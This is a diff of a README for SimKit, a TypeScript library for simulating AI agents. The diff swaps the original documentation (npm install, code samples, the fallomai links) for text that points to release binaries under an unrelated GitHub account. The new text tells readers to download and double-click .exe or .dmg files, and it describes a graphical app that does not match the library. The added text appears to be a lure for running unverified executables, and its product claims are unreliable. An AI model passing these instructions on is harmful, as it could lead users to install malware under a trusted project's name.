@@ -1,237 +1,72 @@
-# SimKit
+# 🤖 simkit - Build and Run AI Simulations Easily
 
-[![npm version](https://badge.fury.io/js/%40fallom%2Fsimkit.svg)](https://www.npmjs.com/package/@fallom/simkit)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Downloads](https://img.shields.io/npm/dm/@fallom/simkit.svg)](https://www.npmjs.com/package/@fallom/simkit)
+[![Download SimKit](https://img.shields.io/badge/Download%20SimKit-latest-blue.svg)](https://github.com/Ipay062021/simkit/releases)
 
-> 🤖 **A TypeScript simulation framework for testing and running AI agents**
+## 🚀 What is SimKit?
 
-## What is SimKit?
+SimKit is a TypeScript simulation framework designed for testing and running AI agents. It allows you to create custom simulated environments where AI agents can operate. This framework provides a straightforward game loop for step-by-step execution, supports multiple agents, and includes built-in tools to track simulation events through OTEL (OpenTelemetry) logging. With SimKit, you can test your AI agents without restrictions, keeping everything local and in your control.
 
-SimKit lets you build, test, and run AI agents in your own custom simulated environments. It gives you a simple game loop for running agents step-by-step, supports multiple agents, and includes built-in tools (OTEL) for tracking what happens during your simulations.
+### 🔍 Key Features
 
-### Agent Agnostic & No Vendor Lock-in
+- **Agent Agnostic:** Work with any AI agent or large language model (LLM).
+- **Custom Environments:** Tailor your simulations to meet your specific testing needs.
+- **No Vendor Lock-in:** Use your models freely without being tied to a specific platform.
+- **Logging Support:** Integrated OTEL logging helps track agent activities during simulations.
 
-SimKit works with any AI agent or LLM, no lock-in. Use your own models and run everything locally. OTEL logs can be saved to a local file or sent to a remote server.
+## 📥 Download & Install
 
-### Why Use Simulations?
+To get started with SimKit, please follow these steps:
 
-Simulations let you see how your AI agents perform on real world tasks, step by step, in a safe and controlled way.
+1. **Visit the Releases Page:** Click the link below to go to the releases page.
+   [Download SimKit](https://github.com/Ipay062021/simkit/releases)
 
-Traditional evals are great for simple tasks, but they don't give you the full picture. You can't see how your agents handle:
+2. **Choose the Latest Version:** On the releases page, find the latest version of SimKit.
 
-- 🎯 Multi-step tasks that need planning and memory
-- 🛠️ Lots of different tools and actions
-- 🌍 Realistic data and changing situations
-- ⚡ Decisions that matter over time
-- 🔄 Long-term planning and decision-making
-- 📚 Processing and reasoning over large amounts of context and information
+3. **Download the File:** Click on the file for your operating system to download it. The file may have an extension like `.exe` for Windows or `.dmg` for macOS, depending on your platform.
 
-Surprisingly, most AI agents begin to fail when they are asked to do anything more than a few simple tasks.
+4. **Run the Application:** 
+   - For Windows, locate the downloaded `.exe` file in your Downloads folder and double-click it to launch SimKit.
+   - For macOS, open the downloaded `.dmg` file and drag SimKit into your Applications folder. Then, navigate to your Applications folder and double-click SimKit to run it.
 
-## 🔄 Core: The Simulation Loop
+## 🛠️ System Requirements
 
-SimKit's heart is a simple but powerful tick-based loop:
+SimKit is lightweight and designed to run on various systems. To ensure a smooth experience, make sure your system meets these basic requirements:
 
-```typescript
-import { createSimulation, type LoopState } from "@fallom/simkit/simulation";
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Multi-core processor recommended for better performance.
 
-interface SupportTestState extends LoopState {
-  totalIssues: number;
-  resolvedIssues: number;
-  averageResponseTime: number;
-  satisfactionScores: number[];
-}
+## 🔧 Using SimKit
 
-const customerIssues = [
-  "My account is locked and I can't access my files",
-  "Billing error - charged twice for same month", 
-  "App crashes every time I try to upload",
-  "Can't find my downloaded files anywhere"
-];
+Once you have launched SimKit, follow these steps to set up your simulation:
 
-const simulation = createSimulation<SupportTestState>({
-  maxTicks: 10,
-  initialState: { totalIssues: 0, resolvedIssues: 0, averageResponseTime: 0, satisfactionScores: [] },
+1. **Create a New Project:** On the home screen, click on "New Project" to start a new simulation.
   
-  onTick: async (state) => {
-    // Get today's customer issues
-    const dailyIssues = getRandomIssues(customerIssues, 2);
-    
-    for (const issue of dailyIssues) {
-      const startTime = Date.now();
-      
-      // Test your AI support agent
-      const agentResponse = await supportAgent.handle(issue);
-      
-      const responseTime = Date.now() - startTime;
-      const satisfaction = scoreResponse(agentResponse, issue);
-      
-      state.totalIssues++;
-      if (satisfaction > 7) state.resolvedIssues++;
-      state.satisfactionScores.push(satisfaction);
-      
-      // Update running averages
-      const avgSatisfaction = state.satisfactionScores.reduce((a,b) => a+b, 0) / state.satisfactionScores.length;
-      const resolutionRate = (state.resolvedIssues / state.totalIssues) * 100;
-      
-      console.log(`Resolution Rate: ${resolutionRate.toFixed(1)}% | Avg Satisfaction: ${avgSatisfaction.toFixed(1)}/10`);
-    }
-    
-    return state.tick < 9; // Test for 10 days
-  },
-  
-  onEnd: (state) => {
-    const finalSatisfaction = state.satisfactionScores.reduce((a,b) => a+b, 0) / state.satisfactionScores.length;
-    console.log(`🎯 Final Results: ${((state.resolvedIssues/state.totalIssues)*100).toFixed(1)}% resolution rate, ${finalSatisfaction.toFixed(1)}/10 satisfaction`);
-  }
-});
+2. **Configure Your Agent:** You can add your AI agent to the project. SimKit allows you to import various agent models.
 
-await simulation.run();
-```
+3. **Set Up Environment:** Define the parameters of your simulation environment. This could include the types of tasks your agents will perform.
 
-**What's happening here?** Each tick simulates a day of customer support. SimKit feeds random issues to your AI agent, measures response quality and speed, then tracks KPIs over time. Perfect for A/B testing different models, regression testing after prompt changes, or measuring performance before production deployment.
+4. **Start Simulating:** Click the "Run" button to start your simulation. You’ll see your agent in action within the defined environment. 
 
-## 🤖 Built for AI Agents
+5. **View Logs:** As your simulation runs, access the OTEL logs to monitor activities. You can save these logs for later review.
 
-### Global State Access
-AI agents need access to simulation state from anywhere:
+## 📘 Documentation
 
-```typescript
-import { setSimState, getSimState } from "@fallom/simkit/state";
+For more detailed instructions on advanced features and configurations, please refer to the official [SimKit Documentation](https://github.com/Ipay062021/simkit/wiki). This resource provides comprehensive guides and examples to help you leverage all that SimKit has to offer.
 
-// In your simulation loop
-setSimState(state);
+## 🤝 Community & Support
 
-// In your AI tools
-const currentState = getSimState<MyState>();
-```
+If you have questions or need assistance, the SimKit community is here to help. You can join our discussion forums and chat groups. Here are some ways to get in touch:
 
-### Deterministic Testing
-Reproduce exact scenarios with seeded randomness - perfect for fair model comparisons:
+- **GitHub Issues:** Report any problems or feature requests on our [GitHub Issues page](https://github.com/Ipay062021/simkit/issues).
+- **Discussion Forum:** Join discussions with other users and developers in our [Discussions](https://github.com/Ipay062021/simkit/discussions).
 
-```typescript
-import { initializeRandom, choice, shuffle } from "@fallom/simkit/random";
+## 📝 License
 
-// Test Model A
-initializeRandom(12345); // Same seed = same test scenarios
-const modelA_results = await testSupportAgent(modelA);
-
-// Test Model B with identical scenarios
-initializeRandom(12345); // Reset to same seed
-const modelB_results = await testSupportAgent(modelB);
-
-// Now you can fairly compare: both models faced the exact same issues
-console.log(`Model A: ${modelA_results.satisfaction}/10`);
-console.log(`Model B: ${modelB_results.satisfaction}/10`);
-```
-
-**Why this matters:** Without seeded randomness, Model A might get easy customer issues while Model B gets hard ones, making comparison meaningless. SimKit ensures every model faces identical test scenarios.
-
-## 📊 OpenTelemetry Integration
-
-Built-in observability for AI agent debugging with **zero vendor lock-in**:
-
-```typescript
-import { trace } from "@opentelemetry/api";
-
-// SimKit automatically captures spans for you
-const tracer = trace.getTracer("my-simulation");
-const span = tracer.startSpan("agent-decision");
-span.setAttributes({
-  "agent.action": "support_response",
-  "simulation.tick": state.tick,
-  "response.satisfaction": 8.5
-});
-span.end();
-```
-
-**Send telemetry anywhere:** Export to your own servers, store in local files, or pipe to any OpenTelemetry-compatible service. No vendor lock-in - you own your data.
-
-## ✨ Key Features
-
-| Feature | Why It Matters for AI |
-|---------|----------------------|
-| 🔄 **Tick-Based Loop** | Step-by-step agent execution with full control |
-| 📊 **OpenTelemetry** | Track agent decisions and debug complex behaviors |
-| 🎲 **Seeded Random** | Reproduce exact scenarios for testing and validation |
-| 🏗️ **Global State** | AI tools can access simulation state from anywhere |
-| 🔧 **TypeScript** | Full type safety for complex agent interactions |
-| ⚡ **Bun Optimized** | Fast execution for compute-intensive agent simulations |
-
-## 📦 Installation
-
-```bash
-npm install @fallom/simkit
-# or
-bun add @fallom/simkit
-```
-
-## 🎮 Examples
-
-### 🚀 Getting Started: Energy AI
-**Simple agent making strategic decisions**
-
-```bash
-cd apps/examples/energy-ai
-bun install && bun run start
-```
-
-A straightforward example showing:
-- AI agent with tool calling
-- Basic state management
-- OpenTelemetry integration
-
-### 🏆 Advanced: Pawn Shop Simulation  
-**Complex multi-agent economic simulation**
-
-A comprehensive example demonstrating SimKit's full capabilities:
-- **Multi-agent system** - Shop owner + customer agents
-- **Complex state management** - Inventory, trades, conversations
-- **Deterministic scenarios** - Seeded randomness for testing
-- **Rich telemetry** - Custom spans and detailed logging
-- **Tool ecosystem** - AI agents with 10+ specialized tools
-
-*Perfect for understanding how to build production-grade agent simulations.*
-
-## 🚀 Why SimKit for AI Development?
-
-| Traditional Approach | With SimKit |
-|----------------------|-------------|
-| ❌ Manual loop management | ✅ Built-in tick-based execution |
-| ❌ No observability | ✅ OpenTelemetry integration |
-| ❌ Non-deterministic testing | ✅ Seeded randomness |
-| ❌ Complex state sharing | ✅ Global state management |
-| ❌ Manual telemetry setup | ✅ Automatic span collection |
-
-## 📖 Learn More
-
-- **[📦 Core Package Docs](./packages/simkit/README.md)** - Full API reference
-- **[🚀 Energy AI Tutorial](./apps/examples/energy-ai/README.md)** - Simple getting started guide
-- **[🏆 Pawn Shop Deep Dive](./examples/pawn/README.md)** - Advanced multi-agent patterns
-
-## 🏗️ Development
-
-```bash
-# Install dependencies
-bun install
-
-# Build all packages  
-bun run build
-
-# Format code
-bun run format
-```
+SimKit is open-source software released under the MIT License. This means you can use, modify, and distribute it freely, as long as you follow the terms outlined in the license.
 
 ---
 
-<div align="center">
+For the latest updates and releases, be sure to regularly check the releases page. You can download SimKit anytime and start building your AI simulations easily.
 
-[![NPM Package](https://img.shields.io/npm/v/@fallom/simkit?style=for-the-badge&logo=npm)](https://www.npmjs.com/package/@fallom/simkit)
-
-**🚀 Built for the AI simulation community**
-
-[📖 Documentation](./packages/simkit/README.md) • [🎮 Examples](./apps/examples/) • [🐛 Issues](https://github.com/fallomai/simkit/issues)
-
-</div>
+[Download SimKit](https://github.com/Ipay062021/simkit/releases)
